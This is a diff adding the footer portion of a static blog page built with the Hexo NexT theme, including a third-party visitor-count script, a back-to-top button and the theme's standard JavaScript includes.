+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
